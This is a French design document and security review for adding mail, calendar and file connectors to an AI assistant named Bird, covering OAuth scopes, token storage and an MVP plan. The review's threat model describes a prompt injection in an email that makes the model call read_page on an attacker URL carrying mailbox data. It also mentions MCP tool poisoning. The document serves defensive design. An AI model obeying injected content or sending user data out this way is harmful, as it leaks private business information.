# Connecteurs : conception

# Connecteurs pour Bird : proposition de conception

C'est une conception, sans aucune modification de code. J'ai lu `docs/WEB.md`, `docs/HARNESS.md`, `docs/DEPLOY_VERCEL.md`, `birds/web/server.py`, `birds/web/settings.py`, `birds/harness/guard.py`, `birds/harness/intents.py` et `birds/web/tokens.py`. Les points sur les fournisseurs viennent de leur documentation officielle, consultée le 27/11/2026, sauf ceux notés « à vérifier ».

## 0. Ce qui compte le plus

1. **Bird S 4B n'a pas appris de nouveaux outils.** Un connecteur fonctionne donc comme les fiches lieux et météo : `intents.py` et `when.py` lisent les mots de l'utilisateur, le harnais lance l'appel lui-même avant la première génération (étape « automatique », voir `agent.py` vers les lignes 920 et 1143), puis passe le résultat au modèle comme donnée.
   - Le bloc `BIRD_TOOLS` ne change pas d'un octet (cache de préfixe et entraînement préservés).
   - Le modèle ne fait que lire, résumer et rédiger.
   - Les fiches sont construites à partir des résultats des appels, jamais à partir du texte du modèle (c'est déjà la règle dans `WEB.md`).
2. **Trois écarts dans le code actuel à corriger avant tout connecteur :**
   - **`guard._hops` recopie les en-têtes à chaque redirection** (`hdrs = dict(headers)`), y compris vers un autre hôte. Un en-tête `Authorization` partirait donc chez un tiers. Il faut une fonction d'appel authentifié dédiée : pas de redirection suivie (ou suppression du jeton dès que l'hôte change), POST permis (`_hops` ne fait que des GET), liste fixe d'hôtes par connecteur, réponse JSON plafonnée.
   - **`guard.gate` ne demande confirmation que si la requête est « suspecte »** (`tainted`). Une écriture vers un connecteur doit toujours être confirmée. Il faut ajouter `CONNECTOR_WRITE_TOOLS`, qui exige `confirmed` sans condition.
   - **Un jeton de confirmation peut être rejoué pendant 15 minutes** (c'est écrit dans `DEPLOY_VERCEL.md` § 5). C'est sans conséquence pour un brouillon rendu au navigateur, mais pas pour un brouillon créé dans Outlook. Il faut un numéro à usage unique (`jti`) consommé dans un petit stockage clé-valeur (`SET NX` avec expiration).
3. **La politique de sécurité du navigateur (CSP) n'a presque pas à bouger.**
   - La connexion OAuth se fait par navigation de page entière (`location.href = /api/connectors/{id}/start`). `form-action 'none'` ne s'applique pas à une navigation, et tous les appels aux fournisseurs partent du serveur, donc `connect-src 'self'` suffit.
   - Seule exception : le sélecteur Google Picker charge un script de apis.google.com et une iframe, ce qui obligerait à élargir `script-src` et `frame-src`. Je propose de l'écarter et de le remplacer par une recherche côté serveur.
   - La route de retour OAuth reçoit `sec-fetch-site: cross-site` : elle ne doit pas passer par `guard_request` et `same_origin`. Elle vérifie à la place `state`, le vérificateur PKCE et `iss`.
   - Le cookie temporaire qui porte `state` et le vérificateur PKCE doit être en `SameSite=Lax`, sinon il n'est pas renvoyé au retour de la page de connexion du fournisseur. Le cookie de jetons, lui, peut être en `SameSite=Strict`.

## 1. Connecteurs prioritaires pour une PME française

| Rang | Connecteur | Pourquoi |
|---|---|---|
| 1 | **Microsoft 365** : Outlook (mail, agenda), puis OneDrive et SharePoint, Teams plus tard | Suite la plus répandue dans les PME françaises, une seule connexion OAuth pour tout, et des permissions en lecture sans validation lourde côté éditeur |
| 2 | **Simples, sans OAuth** : flux iCal, RSS, URL publique, lien CSV ou Google Sheet publié | Une demi-journée chacun, ils réutilisent `guard.fetch` et prouvent la chaîne « @ → appel → fiche » |
| 3 | **Google Workspace** : Agenda, Drive, Gmail | Très répandu aussi, mais Gmail en lecture est une permission « restreinte » (voir § 2) |
| 4 | **Notion** | Base documentaire de beaucoup de petites équipes ; l'utilisateur choisit lui-même les pages partagées (moindre privilège naturel) |
| 5 | **Serveurs MCP distants génériques** | Ouvre tous les connecteurs MCP (Notion, HubSpot, Atlassian…) sans code spécifique |
| 6 | **CRM** : HubSpot, Pipedrive, Salesforce | HubSpot et Pipedrive sont plus courants que Salesforce dans les PME ; par MCP quand c'est possible |
| 7 | **Slack** | Limites de débit très basses pour une application distribuée hors du Marketplace (voir § 6) ; Teams couvre déjà une bonne partie des PME françaises |

## 2. Fiche par connecteur

Règle commune : OAuth 2 avec code d'autorisation et PKCE (S256), `state`, validation de `iss` (RFC 9207), lecture seule au départ, permissions supplémentaires demandées seulement au moment où elles servent (consentement progressif).

**Microsoft 365 (Microsoft Graph)**
- Plateforme d'identité Microsoft v2, application multi-locataire.
- MVP : `openid profile offline_access User.Read Mail.ReadBasic Mail.Read Calendars.Read`.
- Phase 2 : `Files.Read` (fichiers de l'utilisateur) ; `Sites.Selected` plutôt que `Sites.Read.All` pour SharePoint (accès accordé site par site par l'administrateur).
- Plus tard : `Chat.Read` ; `ChannelMessage.Read.All`, qui exige le consentement de l'administrateur (confirmé dans la doc).
- Écriture (brouillons) : `Mail.ReadWrite`, demandé seulement à la première écriture.
- Beaucoup de locataires bloquent le consentement individuel : prévoir le lien de consentement administrateur (`/adminconsent`).
- À vérifier : la page de référence des permissions était tronquée, je n'ai pas pu confirmer quelles permissions de lecture exigent l'administrateur.

**Google Workspace**
- Agenda : `calendar.events.readonly` (ou `calendar.freebusy` pour les seules disponibilités). Probablement « sensible », donc vérification de l'application mais sans audit de sécurité ; à confirmer dans la console Google Cloud.
- Drive : `drive.file` est la seule permission non sensible, mais elle ne voit que les fichiers ouverts avec l'application ou choisis dans le Picker. `drive.readonly` et `drive.metadata.readonly` sont **restreintes**.
- Gmail : `gmail.readonly` et `gmail.compose` sont **restreintes**. La doc officielle dit : « If you store restricted scope data on servers (or transmit), then you must go through a security assessment ».
- Conséquence : Gmail et la recherche dans Drive demandent un audit de sécurité annuel. En attendant, un administrateur Workspace peut déclarer l'application « de confiance » pour son domaine, et une application non vérifiée reste limitée à 100 utilisateurs.

**Notion**
- Intégration publique en OAuth ; l'utilisateur choisit les pages partagées pendant la connexion.
- Chaque renouvellement donne un nouveau jeton de renouvellement et invalide l'ancien : il faut réécrire le jeton stocké à chaque renouvellement.
- Révocation : `POST /v1/oauth/revoke`.
- Alternative : le serveur MCP hébergé de Notion (à vérifier).

**Slack**
- Jeton utilisateur, permissions `search:read`, `channels:history`, `users:read`. Phase 3.

**HubSpot, Pipedrive, Salesforce**
- HubSpot en OAuth : `crm.objects.contacts.read`, `crm.objects.companies.read`, `crm.objects.deals.read`.
- Pipedrive en OAuth avec ses permissions en lecture ; Salesforce avec la permission `api`.
- Passer de préférence par leurs serveurs MCP distants quand ils existent (à vérifier pour chacun).

**MCP distant générique** (spécification 2026-07-28)
- OAuth 2.1 et PKCE obligatoires.
- Découverte du serveur d'autorisation par les métadonnées de ressource protégée (RFC 9728), puis RFC 8414 ou OIDC Discovery.
- Paramètre `resource` (RFC 8707) obligatoire dans la demande d'autorisation et dans la demande de jeton.
- Enregistrement du client : de préférence par un document de métadonnées. Bird publierait `https://<domaine>/.well-known/bird-client.json` comme `client_id`. L'enregistrement dynamique est désormais déprécié.
- Jeton jamais dans l'URL ; un jeton n'est envoyé qu'au serveur pour lequel il a été émis.
- Permissions : celles du `WWW-Authenticate`, sinon `scopes_supported` ; montée en permissions sur un `403 insufficient_scope`.

**Connecteurs simples (iCal, RSS, URL, CSV)**
- Aucune authentification : `guard.fetch` tel qu'il est (liste de domaines optionnelle).
- L'URL est stockée dans le navigateur, comme les conversations.
- Une URL iCal secrète (agenda Outlook ou Google publié) est un mot de passe : elle n'est jamais journalisée, et elle est masquée par le filtre `redact`.

## 3. Où vivent les jetons sur une application sans état

**Option A (MVP) : cookie chiffré**
- Cookie `__Host-bird_conn_<id>`, `httpOnly`, `Secure`, `SameSite=Strict`, `Path=/`.
- Contenu : AES-256-GCM sur `{refresh_token, tid ou hd, sub, scopes, exp}`, avec en données associées l'identifiant du connecteur et le `kid` de la clé.
- Le jeton d'accès n'est pas gardé (au plus un cache mémoire de l'instance) : il est renouvelé à chaque requête si besoin.
- Taille : un jeton de renouvellement Microsoft fait environ 1,5 à 2 Ko, ce qui tient sous 4 Ko par cookie (un cookie par connecteur).
- Rotation des clés : `BIRD_CONNECTOR_KEYS="k2:<b64>,k1:<b64>"`. On chiffre avec la première clé, on déchiffre avec n'importe laquelle, et on rechiffre à la volée.
- Déconnexion : appel de révocation du fournisseur quand il en a un (Google `/revoke`, Notion `/oauth/revoke`, Slack `auth.revoke` ; pour Microsoft il n'y a pas de révocation par jeton, on retire l'application), puis suppression du cookie.
- Limite : pas de révocation centrale par l'administrateur, et la connexion est liée à un navigateur.

**Option B (organisations) : stockage clé-valeur**
- Upstash Redis via le Marketplace Vercel, en région UE (Vercel KV n'existe plus : ses bases ont été migrées vers Upstash en décembre 2024) ; ou Supabase en Postgres UE.
- Chiffrement en enveloppe : une clé par organisation, elle-même chiffrée par la clé maîtresse de l'environnement. Le cookie ne porte qu'un identifiant opaque signé.
- Apporte : révocation par l'administrateur (« déconnecter tout le monde »), numéros à usage unique pour les confirmations, limites de débit partagées entre instances, compteur d'audit.

**Recommandation :** l'option A pour le MVP ; l'option B dès qu'on active l'administration par organisation ou les écritures (le numéro à usage unique en a besoin).

## 4. Ce que le harnais appelle tout seul, et les fiches affichées

Il faut ajouter `connectors` dans `intents.py` (même structure `Intent(tool, args, mode)`) et réutiliser `when.py` pour les dates. Règle : appel automatique quand la demande est sûre, rien sinon (aucune proposition d'outil au modèle, puisqu'il ne les connaît pas).

| Demande | Appel | Fiche |
|---|---|---|
| « mes mails non lus de Paul » | Graph `/me/messages?$filter=isRead eq false and from/emailAddress/address eq …&$select=from,subject,receivedDateTime,bodyPreview&$top=10` (Paul est d'abord résolu par `/me/people`, et en cas de doute la fiche montre les candidats) ; Gmail `q=is:unread from:paul` | **Liste de mails** : expéditeur, objet, date, aperçu, lien « Ouvrir dans Outlook » |
| « mes réunions de demain » | Graph `/me/calendarView?startDateTime=…&endDateTime=…` dans le fuseau du navigateur (`body.tz`) ; Google `events.list` avec `timeMin`/`timeMax`/`singleEvents` | **Agenda** du jour : créneaux, lieu, lien Teams ou Meet, conflits mis en évidence ; réutilise le style de la fiche Horloge |
| « le dernier contrat dans SharePoint » | Graph `/search/query` (`driveItem`, requête « contrat », tri par date décroissante, 5 résultats) | **Fichier** : nom, auteur, date, chemin, extrait ; aperçu par le texte extrait avec les lecteurs pdf/docx existants, plafonné à 6 000 caractères ; jamais d'iframe |
| « résume le mail de Paul sur le devis » | Recherche, puis lecture du corps converti en texte pour le seul premier résultat | Liste de mails avec un seul élément déplié |
| « @notion compte rendu comité » | `/v1/search` | Liste de documents |
| « @crm Dupont » | Recherche de contacts et de sociétés | **Fiche CRM** : société, contact, affaire en cours, étape |
| « @agenda-equipe cette semaine » (flux iCal) | Téléchargement puis lecture iCal | Agenda |

Règles de déclenchement :
- Un possessif avec un nom de source (« mes mails », « mon agenda ») ou une mention « @ » ; jamais sur un mot isolé (comparer à `_APPS` : « où est Teams ? » ne déclenche rien).
- Avec une pièce jointe, aucun appel automatique, comme pour les lieux.

## 5. Écritures : brouillons seulement, confirmation explicite

- Le modèle rédige avec `draft_email`, l'outil existant et entraîné.
- La fiche du brouillon gagne un bouton « Créer le brouillon dans Outlook » (ou Gmail).
- Le clic passe par le mécanisme de confirmation existant : jeton signé (`tokens.sign`), lié à la conversation et au backend, avec un numéro à usage unique en plus. Le serveur appelle ensuite Graph `POST /me/messages`, qui crée un brouillon.
- **Jamais d'envoi** : on ne demande pas `Mail.Send` ni `gmail.send`. L'utilisateur envoie depuis son client de messagerie.
- Même principe plus tard pour « créer l'événement dans l'agenda » (`Calendars.ReadWrite`) et « ajouter une note au CRM ».
- Le résumé de confirmation est construit par le serveur à partir des arguments (destinataires, objet, 200 premiers caractères), jamais à partir du texte du modèle.

## 6. Sécurité, vie privée, limites

**Injection de requête (prompt injection)**
- Ajouter les outils de connecteur à `EXTERNAL_TOOLS` : `wrap_untrusted`, `defang` et `scan_injection` s'appliquent alors.
- Un résultat signalé marque la requête comme suspecte. Comme toute écriture est de toute façon confirmée, cela n'ajoute qu'un bandeau « contenu suspect » sur la fiche.
- Les descriptions d'outils fournies par un serveur MCP ne sont jamais mises dans l'invite (risque d'empoisonnement d'outil).
- Le HTML des mails est converti en texte côté serveur, sans images ni liens actifs, et les liens de suivi sont retirés.

**Minimisation, RGPD**
- Le modèle ne reçoit que les champs `$select` (expéditeur, objet, date, aperçu de 200 caractères), 10 éléments au plus. Un corps de mail n'est lu que sur demande, pour un seul mail.
- Aucun contenu stocké côté serveur ; la conversation reste dans le `localStorage` comme aujourd'hui (le documenter dans la politique de confidentialité).
- Pas d'entraînement sur les données des clients, écrit dans le contrat et dans l'écran de connexion. Si l'endpoint du modèle est chez Hugging Face, prendre une région UE et un contrat de sous-traitance.
- Fournir un modèle de registre de traitement et un DPA (contrat de sous-traitance) pour les PME.
- La page « Connecteurs » dit : « Bird lit à votre demande, ne garde rien, n'envoie jamais de mail. »

**Journal d'audit**
- `Audit.log("connector_call", connector, op, n_items, ms, decision, scopes)`, en métadonnées seulement (`meta_only`) : identifiant d'utilisateur haché (`sub` + sel), identifiant de locataire, jamais un objet ni un corps de mail.
- Les écritures sont journalisées avec leur décision et une empreinte des arguments.
- Option B : un compteur par organisation, exportable par l'administrateur.

**Administration par organisation** (sans comptes dans Bird : l'identité vient du connecteur)
- `BIRD_CONNECTORS=m365,ical,rss` pour la liste des connecteurs actifs.
- `BIRD_CONNECTOR_TENANTS=<tid Entra>,<domaine Workspace>` : liste blanche des organisations, vérifiée sur `tid` ou `hd` du jeton d'identité.
- `BIRD_MCP_ALLOWED_HOSTS` : comme `endpoint_allowed_hosts`. Aucun serveur MCP libre par défaut sur un déploiement partagé.
- Le code d'accès (`BIRD_ACCESS_CODE`) reste exigé.
- Option B : une page d'administration pour activer les connecteurs et les outils MCP autorisés, outil par outil.

**Limites de débit**
- Graph répond 429 avec `Retry-After` : une seule nouvelle tentative si l'attente fait moins de 5 s, sinon un message clair.
- Gmail fonctionne par quotas d'unités par utilisateur, Notion autour de 3 requêtes par seconde.
- Slack : pour une application distribuée hors Marketplace, `conversations.history` et `.replies` sont tombés à 1 requête par minute et 15 éléments par réponse (changelog Slack de mai 2025). Il faudrait une application interne par espace de travail, ou le serveur MCP de Slack.
- Côté Bird : limite par utilisateur et par connecteur, stockée dans le clé-valeur (le limiteur en mémoire actuel est par instance) ; au plus 3 appels de connecteur par requête ; budget de 15 s, compatible avec la limite de 300 s.

## 7. Interface

**Réglages → « Connecteurs »**
- Une carte par source : logo dessiné sur place (pas d'icône distante, à cause de la CSP), état (Connecté en tant que x@y, Expiré, Désactivé par l'administrateur), boutons « Connecter », « Déconnecter », « Tester ».
- Permissions en français simple, par exemple :
  - `Mail.Read` : « Lire vos mails (jamais les envoyer) »
  - `Calendars.Read` : « Voir votre agenda »
  - `Mail.ReadWrite` : « Créer des brouillons dans Outlook »
- Pour les connecteurs simples : un champ URL, puis un nom court utilisé comme « @nom ».

**Composeur**
- Taper « @ » ouvre une liste des sources connectées (clavier et lecteur d'écran). Une pastille « @Outlook » s'insère et envoie `target: "m365.mail"` dans `ChatBody`.
- La mention force la source (pas d'ambiguïté) mais ne lance un appel que si la demande se lit sans doute.

**Fiches**
- Toujours un pied « Source : Outlook · lu à 14:02 · 7 éléments ».
- Rien ne s'affiche hors de Bird : tout passe par le serveur, même origine.

## 8. Plan par phases

| Phase | Contenu | Effort |
|---|---|---|
| 0. Socle | Appel authentifié sans redirection ni fuite de jeton ; module `connectors/` (OAuth et PKCE, cookie AES-GCM avec rotation de clés) ; routes `/api/connectors/*` ; outils « jamais sans confirmation » ; audit ; page Connecteurs ; « @ » | 6 à 8 jours |
| **1. MVP, 2 connecteurs** | **Microsoft 365, Outlook mail et agenda en lecture**, fiches Liste de mails et Agenda, demandes « non lus de X », « réunions de demain » ; **flux iCal et RSS** (sans OAuth) | 8 à 10 jours |
| 2 | Brouillon Outlook par confirmation, avec numéro à usage unique (Upstash UE) ; OneDrive et SharePoint (`Files.Read`, `Sites.Selected`, fiche Fichier) ; Google Agenda ; Notion | 10 à 12 jours |
| 3 | Client MCP distant générique (HTTP en flux, OAuth 2.1, documents de métadonnées client, ressource, montée en permissions), outils autorisés par l'administrateur, fiche générique ; HubSpot et Pipedrive par MCP ; Gmail et Drive complet une fois l'audit Google lancé ; Teams | 12 à 15 jours, plus l'audit Google (plusieurs semaines) |
| 4 | Administration par organisation (option B), révocation centrale, export d'audit, Slack | 6 à 8 jours |

Au total, environ 45 à 55 jours de développement jusqu'à la phase 4. Le MVP est utilisable vers 15 jours.

**Client MCP générique et petit modèle.** L'administrateur relie une mention à un outil MCP précis et à un modèle d'arguments (par exemple `@crm` → `search_contacts{query}`). Sans configuration, seuls les outils qui ont un unique argument texte requis sont appelables par « @source texte ». On ne se fie pas à l'annotation `readOnlyHint` (non garantie) : seule la liste blanche fait foi. Le contenu structuré est affiché si sa forme est reconnue, sinon on garde le texte, tronqué.

## 9. Risques

- **Audit Google pour les permissions restreintes** (Gmail, Drive complet) : coût et délai. C'est pourquoi Microsoft 365 passe d'abord.
- **Le petit modèle se trompe en résumant** (expéditeur, date). La fiche, construite à partir des résultats, sert de vérité ; la réponse rappelle de vérifier.
- **Une injection non détectée** dans un mail pousse à un mauvais brouillon. Garde-fou : aucun envoi possible et confirmation systématique.
- **Fausses détections** (« Paul » ambigu, « demain » à minuit). Garde-fou : fiche de choix, et le fuseau du navigateur.
- **Consentement bloqué dans le locataire Microsoft** : prévoir un guide pour l'administrateur.
- **Taille des cookies, renouvellements simultanés** (Notion fait tourner ses jetons de renouvellement) : verrou court dans le clé-valeur, ou réécriture du cookie à chaque réponse.
- **Fuite ou perte de la clé maîtresse** : les connexions deviennent illisibles, donc rotation des clés plus reconnexion.
- **Le serveur MCP générique est une surface d'attaque** (exfiltration réseau, empoisonnement d'outils) : désactivé par défaut, liste blanche d'hôtes, vérification `check_url` sur chaque requête.
- **Évolution des spécifications** : MCP passe d'une version à l'autre (2026-07-28 aujourd'hui), les limites de Slack ont changé.

## 10. Fichiers à toucher

- `birds/harness/guard.py` : appel authentifié, `CONNECTOR_WRITE_TOOLS`, `EXTERNAL_TOOLS`
- `birds/harness/intents.py` : nouvelles demandes reconnues
- `birds/harness/agent.py` : chemin des appels automatiques
- `birds/web/server.py` : routes `/api/connectors/*`, cible « @ » dans `ChatBody`
- `birds/web/settings.py` : `BIRD_CONNECTORS`, `BIRD_CONNECTOR_KEYS`, `BIRD_CONNECTOR_TENANTS`, `BIRD_MCP_ALLOWED_HOSTS`, `BIRD_KV_URL`, identifiants des applications OAuth
- `birds/web/widgets.py`, `birds/web/static/widgets.js`, `views.js` : fiches Mails, Agenda, Fichier, CRM et page Connecteurs
- `birds/web/tokens.py` : numéro à usage unique dans les jetons de confirmation
- Nouveau paquet `birds/harness/tools/connectors/`

## Sources

- https://modelcontextprotocol.io/specification/latest/basic/authorization
- https://developers.google.com/workspace/gmail/api/auth/scopes
- https://developers.google.com/workspace/drive/api/guides/api-specific-auth
- https://developers.google.com/calendar/api/auth
- https://learn.microsoft.com/en-us/graph/permissions-reference
- https://developers.notion.com/reference/refresh-a-token
- https://docs.slack.dev/changelog/2025/05/29/rate-limit-changes-for-non-marketplace-apps
- https://vercel.com/docs/redis


---

# Revue sécurité et plan MVP

# Critique de la conception des connecteurs Bird, et plan MVP corrigé

Je n'ai rien modifié dans le dépôt. J'ai vérifié le code sur pièce : `birds/harness/guard.py`, `birds/web/server.py`, `birds/web/tokens.py`, `docs/HARNESS.md` et `docs/DEPLOY_VERCEL.md`. Les faits sur les fournisseurs ont été vérifiés sur leur documentation officielle le 27/11/2026, sauf quand c'est indiqué autrement.

**Verdict :** la conception est solide sur le fond. Le harnais appelle les outils lui-même, le bloc `BIRD_TOOLS` ne change pas, les fiches sont construites à partir des résultats et les écritures se limitent à des brouillons. Ses trois constats sur le code sont exacts :
- `_hops` recopie les en-têtes à chaque redirection (`hdrs = dict(headers)`, ligne 190) ;
- `gate` laisse passer toute action tant que la requête n'est pas marquée suspecte (`if not tainted: return "allow"`, ligne 505) ;
- un jeton de confirmation peut être rejoué pendant 15 minutes (`DEPLOY_VERCEL.md` § 5).

Il lui manque en revanche **le risque principal**, plusieurs **permissions Microsoft sont fausses ou insuffisantes**, et le **calendrier est optimiste d'environ 40 %**.

## 1. Points bloquants absents de la conception (par gravité)

1. **Fuite de données par les outils de lecture du modèle.**
   - Bird S 4B appelle toujours lui-même `web_search` et `read_page`. Ces outils ne sont pas dans `SIDE_EFFECT_TOOLS` (ligne 47), donc `gate` ne les contrôle jamais.
   - `HARNESS.md` l'admet déjà : « une page piégée peut faire lire une autre page publique (fuite possible d'informations par l'URL demandée) ».
   - Avec une boîte mail dans le contexte, un mail piégé obtient `read_page("https://attaquant/?d=<objets, montants, noms>")`. La règle « toute écriture est confirmée » ne protège pas de ça.
   - **Correctif obligatoire en phase 0 :**
     - dès qu'un résultat de connecteur est dans le contexte, la requête passe dans un mode privé où `web_search`, `read_page`, `find_places` et `find_company` sont refusés (ou confirmés avec l'URL complète affichée) ;
     - `/api/img` ne signe aucune URL issue d'un contenu de connecteur.
   - Ce mode ne doit pas dépendre de `scan_injection`, qui est heuristique.
2. **L'historique gardé dans le `localStorage` est renvoyé à chaque tour.**
   - Les mails lus restent donc sur l'appareil sans limite de durée (RGPD, postes partagés) et réapparaissent dans le contexte des tours suivants, ce qui rouvre la fuite décrite au point 1.
   - **Correctifs :**
     - le résultat brut d'un connecteur sert pour un seul tour ; l'historique ne garde que la fiche et la réponse ;
     - les tours suivants restent en mode privé s'il y reste des marqueurs de contenu de connecteur ;
     - durée de conservation et bouton « Effacer les données des connecteurs de cet appareil ».
3. **Vérification de l'éditeur Microsoft (publisher verification) oubliée.**
   - Depuis novembre 2020, quand le consentement renforcé selon le risque est activé, un utilisateur ne peut pas consentir à une application multi-locataire non vérifiée qui demande plus que la connexion et le profil.
   - Pour une application multi-locataire, c'est donc un prérequis de lancement, pas un détail.
   - C'est gratuit, mais il faut un compte Microsoft Partner Center, un domaine vérifié et l'authentification multifacteur. Compter quelques jours de délai.
4. **Les permissions Graph de la fiche 2 sont fausses.**
   - `/search/query` sur les fichiers (`driveItem`) exige `Files.Read.All` ou `Sites.Read.All`. `Files.Read` ne suffit pas : il ne couvre que `/me/drive`.
   - Depuis la mi-2025, la politique de consentement gérée par Microsoft (message MC1097272, `microsoft-user-default-recommended`) interdit le consentement individuel à `Files.Read.All`, `Files.ReadWrite.All`, `Sites.Read.All` et `Sites.ReadWrite.All` dans les locataires restés sur le réglage par défaut. Le tableau de référence des permissions affiche encore le contraire.
   - **Conséquence :** « le dernier contrat dans SharePoint » demande toujours le consentement de l'administrateur. `Sites.Selected` en délégué demande en plus un accord site par site. Rien de cela ne doit entrer dans le MVP.
   - `/me/people`, utilisé pour retrouver « Paul », exige `People.Read`, qui n'est pas dans la liste.
   - Demander à la fois `Mail.ReadBasic` et `Mail.Read` est redondant. Et `Mail.ReadBasic` exclut le corps et `bodyPreview` : l'aperçu de 200 caractères demande `Mail.Read`.
5. **Pièges OAuth à écrire noir sur blanc.**
   - L'`redirect_uri` vient de la configuration, jamais de `Host` ni de `x-forwarded-host` (`same_origin` lit déjà ces en-têtes). Sinon, un en-tête forgé fait partir le code d'autorisation chez un tiers.
   - Le retour doit se faire en `response_mode=query`. Avec `form_post`, le fournisseur renvoie un POST d'un autre site, et le cookie `SameSite=Lax` qui porte `state` et le vérificateur PKCE n'est pas envoyé.
   - L'autorité est `organizations` : elle exclut les comptes Microsoft personnels, que `/search/query` ne prend d'ailleurs pas en charge.
   - Le `iss` du jeton d'identité se valide avec le `tid` substitué.
   - L'identité retenue est `tid` + `oid`, **jamais `email` ni `preferred_username`**, qui sont modifiables (attaque « nOAuth »). Ce sont aussi `tid` et `oid` qu'on hache pour l'audit.
   - `/start` reste derrière `same_origin` et le code d'accès. Seul le retour en est exempté : il vérifie `state`, PKCE et `iss`, et le cookie temporaire signé créé par `/start` prouve que le code d'accès a été contrôlé.
   - Côté Bird, l'application est un client confidentiel : un certificat plutôt qu'un secret, ou au minimum un secret à rotation datée (24 mois au plus).
   - Les déploiements de prévisualisation de Vercel ont d'autres URL de retour : OAuth y est désactivé.
6. **Renouvellement des jetons.**
   - Microsoft renvoie aussi un nouveau jeton de renouvellement à chaque fois (l'ancien reste en général valable), et Notion invalide l'ancien. Il faut donc réécrire le cookie à chaque renouvellement, quel que soit le fournisseur.
   - Renouveler à chaque requête ajoute de la latence et use les quotas de la page de jetons. Mieux vaut garder le jeton d'accès chiffré dans un second cookie, avec son expiration.

## 2. Stockage des jetons sur une application sans état

- **Le choix de l'option A (cookie chiffré AES-GCM) pour le MVP est le bon**, avec ces ajouts :
  - deux cookies `__Host-` : le jeton de renouvellement d'un côté, le jeton d'accès en cache et son expiration de l'autre. Chacun reste sous 4 Ko après base64 ;
  - en données associées : l'identifiant du connecteur, le `kid` de la clé, `tid` et `oid` ;
  - une durée de vie absolue de 30 jours, puis reconnexion obligatoire ;
  - une option « ne pas rester connecté sur cet appareil » (cookie de session).
- **La révocation centrale existe déjà pour Microsoft 365**, même sans stockage côté serveur : l'administrateur supprime l'application d'entreprise ou ses autorisations dans Entra, et le renouvellement échoue alors immédiatement. Il faut le documenter : la limite de l'option A pèse moins que ce que dit la conception.
- **L'option B (Upstash en région UE) n'est nécessaire qu'avec les écritures** : numéro à usage unique des confirmations, verrou de renouvellement (Notion), limites de débit partagées entre instances. Elle n'est donc pas dans le MVP.

## 3. Comptes Google à accès restreint : ce que ça implique pour le MVP

- `gmail.readonly`, `gmail.compose`, `drive.readonly` et `drive.metadata.readonly` sont des permissions **restreintes**. Comme Bird fait transiter les données par son serveur, et en plus vers l'endpoint du modèle, l'audit de sécurité CASA est obligatoire.
- **Coût et délai de l'audit :**
  - environ 540 à 675 $ par an en Tier 2 d'après des forums de développeurs (2024 et mai 2026), sans tarif officiel ; à vérifier auprès d'un laboratoire agréé ;
  - plusieurs semaines de délai ;
  - renouvellement tous les 12 mois, compté depuis la lettre de validation ;
  - Google peut exiger le Tier 3, bien plus lourd.
- **Règles d'usage limité de Google (« Limited Use ») :** interdiction d'entraîner des modèles généralistes sur ces données, déclaration de chaque sous-traitant (dont l'hébergeur du modèle) et politique de confidentialité conforme.
- **Pour le MVP :**
  - **pas de Gmail ni de Drive complet sur une instance hébergée** ;
  - une application non vérifiée reste possible pour un pilote : 100 utilisateurs au plus, avec un écran d'avertissement ;
  - **voie rapide si chaque PME déploie sa propre instance** (c'est le modèle de `DEPLOY_VERCEL.md`) : le client crée sa propre application Google de type « Interne » dans son Workspace. Il n'a alors ni vérification ni audit, à confirmer dans la console Google Cloud.
- Google Agenda (`calendar.events.readonly`, permission sensible) demande une vérification plus légère, mais sa durée n'est pas maîtrisée : phase 2.

**Conséquence produit :** il faut prévoir deux modes de déploiement dès la phase 0.
- **Instance autonome :** le client fournit ses propres identifiants d'application dans les variables d'environnement, par exemple `BIRD_M365_CLIENT_ID` et `BIRD_M365_TENANT` pour une application à locataire unique. Pas de vérification de l'éditeur, pas d'audit.
- **Instance hébergée multi-locataire :** éditeur vérifié chez Microsoft, liste blanche `BIRD_CONNECTOR_TENANTS`, et audit Google plus tard.

## 4. Plan MVP corrigé, par priorité

### Phase 0 : socle de sécurité (7 à 9 jours)

1. **Mode privé** (points 1 et 2 du § 1) : outils de lecture du modèle désactivés tant qu'un contenu de connecteur est dans le contexte, plus aucune signature `/api/img` pour ces URL, nettoyage de l'historique.
2. **`authed_request()`, séparé de `_hops`** :
   - aucune redirection suivie ;
   - hôtes fixes par connecteur (`graph.microsoft.com`, `login.microsoftonline.com`) ;
   - GET et POST ;
   - JSON plafonné à environ 1 Mo ;
   - budget de 15 s et 3 appels au plus par requête ;
   - une seule nouvelle tentative sur un 429 dont le `Retry-After` fait moins de 5 s.
3. **Outils de connecteur dans `EXTERNAL_TOOLS`** (`wrap_untrusted`, `defang`, `scan_injection`). Mails convertis en texte côté serveur, liens de suivi retirés.
4. **`redact` étendu** aux jetons, aux codes d'autorisation et aux URL iCal secrètes ; aucune chaîne de requête dans les journaux.
5. **Module `connectors/`** : PKCE, `state`, `iss`, cookies AES-GCM avec rotation de clés (`BIRD_CONNECTOR_KEYS`), routes `/api/connectors/{id}/start|callback|disconnect|test` avec les règles du point 5 du § 1.
6. **`CONNECTOR_WRITE_TOOLS`** : la règle (confirmation toujours exigée) est écrite dès maintenant, même si aucune écriture n'est livrée.

### Phase 1 : MVP (12 à 15 jours)

**Connecteurs simples, iCal et RSS (2 jours, à faire en premier) :** ils prouvent la chaîne « intention → appel → fiche » sans OAuth. L'URL est stockée dans le navigateur et masquée dans les journaux.

**Microsoft 365, lecture du mail et de l'agenda :**
- Autorité `organizations`.
- Permissions de départ : `openid profile offline_access User.Read Mail.ReadBasic Calendars.ReadBasic`, toutes ouvertes au consentement individuel.
- Montée en permission vers `Mail.Read`, seulement à la première demande « résume le mail… » : un seul corps de mail, plafonné.
- Pas de `People.Read` : pour « Paul », récupérer `/me/messages?$filter=isRead eq false&$top=50&$select=from,subject,receivedDateTime` puis filtrer par nom côté serveur ; en cas d'ambiguïté, la fiche montre les candidats.
- Agenda : `/me/calendarView`, avec l'en-tête `Prefer: outlook.timezone` réglé sur le fuseau du navigateur.
- **Consentement administrateur dès le MVP :**
  - détecter les erreurs `AADSTS65001`, `AADSTS90094` et « approval required », puis afficher « Votre administrateur doit autoriser Bird » ;
  - fournir le lien `/adminconsent` pour l'administrateur ;
  - fournir un guide d'une page pour l'administrateur ou le prestataire informatique, consentement administrateur inclus.
- Liste blanche par `tid`, identité `tid` + `oid`. Vérification de l'éditeur pour une instance hébergée.

**Interface :**
- Réglages → « Connecteurs » : permissions en français simple, Connecter, Déconnecter, Tester, état (connecté en tant que…, expiré, administrateur requis) et « Effacer de cet appareil ».
